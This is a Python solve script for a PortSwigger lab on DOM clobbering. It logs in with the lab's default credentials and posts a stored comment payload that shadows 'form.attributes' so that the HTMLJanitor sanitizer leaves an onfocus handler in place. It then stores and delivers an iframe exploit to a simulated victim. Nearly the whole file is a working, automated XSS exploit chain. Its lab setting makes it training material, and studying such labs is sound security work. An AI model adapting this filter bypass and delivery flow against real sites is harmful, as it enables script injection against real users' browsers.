#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Clobbering DOM attributes to bypass HTML filters.

HTMLJanitor iterates `node.attributes.length` to strip attributes. Shadowing
`form.attributes` with an injected `<input id=attributes>` makes `.length`
read `undefined`, so the loop runs zero times and dangerous attributes survive.

The exploit posts a comment with the form payload, then an iframe fragments
`#x` to focus the form and fire `onfocus=print()`. Chrome only.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


COMMENT_PAYLOAD = '<form id=x tabindex=0 onfocus=print()><input id=attributes>'


def login(lab: str, session: requests.Session, user: str, pw: str) -> None:
    r = session.get(f"{lab}/login")
    token = re.search(r'name="csrf" value="([^"]+)"', r.text).group(1)
    r = session.post(
        f"{lab}/login",
        data={"csrf": token, "username": user, "password": pw},
    )
    r.raise_for_status()


def post_comment(lab: str, session: requests.Session, post_id: int, comment: str, name: str, email: str) -> None:
    r = session.get(f"{lab}/post/comment?postId={post_id}")
    token = re.search(r'name="csrf" value="([^"]+)"', r.text).group(1)
    data = {
        "csrf": token,
        "postId": str(post_id),
        "comment": comment,
        "name": name,
        "email": email,
        "website": "",
    }
    r = session.post(f"{lab}/post/comment", data=data)
    r.raise_for_status()


def exploit_body(lab: str, post_id: int) -> str:
    return (
        f'<iframe src={lab}/post?postId={post_id} '
        'onload="setTimeout(()=>this.src=this.src+\'#x\',500)">'
    )


def post_exploit(exploit_server: str, body: str, session: requests.Session) -> None:
    data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
        "responseBody": body,
        "formAction": "STORE",
    }
    r = session.post(exploit_server.rstrip("/") + "/", data=data)
    r.raise_for_status()
    print("[+] Stored exploit on server")


def deliver(exploit_server: str, session: requests.Session) -> None:
    data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "formAction": "DELIVER_TO_VICTIM",
    }
    r = session.post(exploit_server.rstrip("/") + "/", data=data)
    r.raise_for_status()
    print("[+] Delivered exploit to victim")


def main():
    parser = argparse.ArgumentParser(
        description="Solve DOM-based Lab 7: HTMLJanitor attribute clobbering (Chrome only)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    parser.add_argument("exploit_url", help="Exploit server URL")
    parser.add_argument("--post-id", type=int, default=3, help="Blog post ID (default 3)")
    parser.add_argument("--user", default="wiener")
    parser.add_argument("--password", default="peter")
    parser.add_argument("--deliver", action="store_true", help="Store + DELIVER_TO_VICTIM")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    exploit = args.exploit_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    print("[*] Logging in")
    login(lab, s, args.user, args.password)

    print("[*] Posting form+clobber payload as comment")
    post_comment(lab, s, args.post_id, COMMENT_PAYLOAD, "attacker", "a@a.com")

    body = exploit_body(lab, args.post_id)
    print(f"\n[+] Exploit server body:\n{body}")

    if args.deliver:
        post_exploit(exploit, body, s)
        deliver(exploit, s)
        r = s.get(lab)
        if "Congratulations" in r.text or "is-solved" in r.text:
            print("[+] Lab solved!")
        else:
            print("[*] Lab not yet marked solved — give the victim a few seconds and re-check.")
    else:
        print("\n[*] Paste the body into the exploit server, Store, then Deliver to Victim.")


if __name__ == "__main__":
    main()
